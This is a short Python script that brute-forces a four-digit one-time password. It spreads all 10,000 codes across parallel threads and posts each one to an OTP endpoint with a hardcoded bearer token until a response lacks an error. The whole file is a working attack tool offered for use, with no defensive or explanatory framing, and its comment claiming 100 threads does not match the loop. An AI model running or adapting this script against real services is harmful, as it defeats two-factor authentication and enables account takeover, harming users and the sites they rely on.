import requests
import threading

def bruteforceOTP(start, end, url = 'https://website.com/otp'):
    i = start
    while i <= end:
        urlApi = url
        code = str(i).zfill(4)
        headers = {'Authorization': 'Bearer Hh-kgUiKTNFUveGWAV5pnFdDHOpxNwjGroQkRMwd', 'content-type': 'application/json'}
        data = {"code":code};
        r = requests.post(urlApi, json=data, headers=headers, stream=True)
        print('THREAD '+str(start)+' - '+str(end)+' ['+str(code)+']: '+r.text)
        if 'error' not in r.text:
            break
        i += 1

if __name__ == "__main__":
    for x in range(0, 9999, 200): # 100 Thread
        # print(str(x) + ' - ' + str(int(x) + 200))
        t1 = threading.Thread(target=bruteforceOTP, args=(x,x+200))
        t1.start()